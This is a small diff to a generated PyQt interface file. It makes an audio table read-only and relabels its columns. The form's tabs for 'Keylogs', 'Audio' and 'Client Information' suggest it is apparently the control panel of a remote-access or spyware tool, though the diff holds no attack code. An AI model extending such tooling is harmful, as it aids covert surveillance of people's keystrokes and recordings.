@@ -229,6 +229,7 @@ class Ui_Form(object):
 "background-color: #2c3e50;\n"
 "color: #cff7f8;\n"
 "}"))
+        self.audioTable.setEditTriggers(QtGui.QAbstractItemView.NoEditTriggers)
         self.audioTable.setProperty("showDropIndicator", False)
         self.audioTable.setDragDropOverwriteMode(False)
         self.audioTable.setSelectionMode(QtGui.QAbstractItemView.SingleSelection)
@@ -687,9 +688,9 @@ class Ui_Form(object):
         item.setText(_translate("Form", "path", None))
         self.logsTab.setTabText(self.logsTab.indexOf(self.keylogsTab), _translate("Form", "Keylogs", None))
         item = self.audioTable.horizontalHeaderItem(0)
-        item.setText(_translate("Form", "Duration", None))
+        item.setText(_translate("Form", "Date Time", None))
         item = self.audioTable.horizontalHeaderItem(1)
-        item.setText(_translate("Form", "Date", None))
+        item.setText(_translate("Form", "path", None))
         self.logsTab.setTabText(self.logsTab.indexOf(self.audioTab), _translate("Form", "Audio", None))
         self.downloadedLabel.setText(_translate("Form", "Downloaded Na Na/Na", None))
         self.clientInformationGroup.setTitle(_translate("Form", "Client Information", None))
